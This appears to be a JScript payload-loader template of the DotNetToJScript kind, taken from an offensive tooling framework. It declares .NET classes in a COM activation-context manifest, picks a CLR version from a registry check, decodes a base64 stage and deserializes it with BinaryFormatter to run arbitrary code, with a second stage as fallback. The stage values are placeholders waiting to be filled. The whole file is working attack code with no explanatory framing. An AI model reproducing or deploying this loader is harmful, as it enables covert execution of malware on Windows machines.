var manifestXML = '<?xml version="1.0" encoding="UTF-16" standalone="yes"?><assembly manifestVersion="1.0" xmlns="urn:schemas-microsoft-com:asm.v1"><assemblyIdentity name="mscorlib" version="4.0.0.0" publicKeyToken="B77A5C561934E089" />'+
    '<clrClass clsid="{9E28EF95-9C6F-3A00-B525-36A76178CC9C}" progid="System.Text.ASCIIEncoding" threadingModel="Both" name="System.Text.ASCIIEncoding" runtimeVersion="v4.0.30319" />'+
    '<clrClass clsid="{C1ABB475-F198-39D5-BF8D-330BC7189661}" progid="System.Security.Cryptography.FromBase64Transform" threadingModel="Both" name="System.Security.Cryptography.FromBase64Transform" runtimeVersion="v4.0.30319" />'+
    '<clrClass clsid="{F5E692D9-8A87-349D-9657-F96E5799D2F4}" progid="System.IO.MemoryStream" threadingModel="Both" name="System.IO.MemoryStream" runtimeVersion="v4.0.30319" />'+
    '<clrClass clsid="{50369004-DB9A-3A75-BE7A-1D0EF017B9D3}" progid="System.Runtime.Serialization.Formatters.Binary.BinaryFormatter" threadingModel="Both" name="System.Runtime.Serialization.Formatters.Binary.BinaryFormatter" runtimeVersion="v4.0.30319" /></assembly>';

var actObj = new ActiveXObject("Microsoft.Windows.ActCtx");
actObj.ManifestText = manifestXML;

function Base64ToStream(b,l) {
	var enc = actObj.CreateObject("System.Text.ASCIIEncoding");
	var length = enc.GetByteCount_2(b);
	var ba = enc.GetBytes_4(b);
	var transform = actObj.CreateObject("System.Security.Cryptography.FromBase64Transform");
	ba = transform.TransformFinalBlock(ba, 0, length);
	var ms = actObj.CreateObject("System.IO.MemoryStream");
	ms.Write(ba, 0, l);
	ms.Position = 0;
	return ms;
}

var stage_1 = "%_STAGE1_%";
var stage_2 = "%_STAGE2_%";

try {

	var shell = new ActiveXObject('WScript.Shell');
	ver = 'v4.0.30319';

	try {

		shell.RegRead('HKLM\\SOFTWARE\\Microsoft\\.NETFramework\\v4.0.30319\\');
	
	} catch(e) { 
		ver = 'v2.0.50727';
	}

	shell.Environment('Process')('COMPLUS_Version') = ver;

	var ms_1 = Base64ToStream(stage_1, %_STAGE1Len_%);
	var fmt_1 = actObj.CreateObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
	fmt_1.Deserialize_2(ms_1);
	
} catch (e) {

	try{
		
		var ms_2 = Base64ToStream(stage_2, %_STAGE2Len_%);
		var fmt_2 = actObj.CreateObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
		fmt_2.Deserialize_2(ms_2);

	}catch (e2){}
}
